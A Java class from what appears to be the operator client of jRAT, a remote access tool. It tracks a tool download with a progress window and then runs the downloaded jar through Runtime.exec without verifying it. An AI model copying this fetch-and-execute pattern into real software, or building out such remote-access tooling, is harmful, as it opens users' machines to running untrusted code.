package io.jrat.client.listeners;

import io.jrat.client.ui.frames.FrameDownload;

import java.io.File;

import javax.swing.JOptionPane;


public class ToolsDownloadListener extends DownloadListener {

	private File file;
	private String url;
	private FrameDownload frame;

	public FrameDownload getFrame() {
		return frame;
	}

	public File getFile() {
		return file;
	}

	public String getUrl() {
		return url;
	}

	public ToolsDownloadListener(File file, String url) {
		this.url = url;
		this.file = file;
		this.frame = new FrameDownload(this);
		this.frame.setVisible(true);
	}

	@Override
	public void fail(String msg) {
		JOptionPane.showMessageDialog(null, "Failed downloading " + url + "\n" + "Reason: " + msg, "Error", JOptionPane.ERROR_MESSAGE);
	}

	@Override
	public void done(String msg) {
		try {
			Runtime.getRuntime().exec(System.getProperty("java.home") + File.separator + "bin" + File.separator + "java -jar \"" + file.getAbsolutePath() + "\"");
		} catch (Exception e) {
			e.printStackTrace();
		}
		frame.setVisible(false);
		frame.dispose();
	}

	public void reportProgress(int done, int all) {
		if (frame.getBar().getMaximum() != all) {
			frame.getBar().setMaximum(all);
		}

		frame.getBar().setValue(done);
	}

}
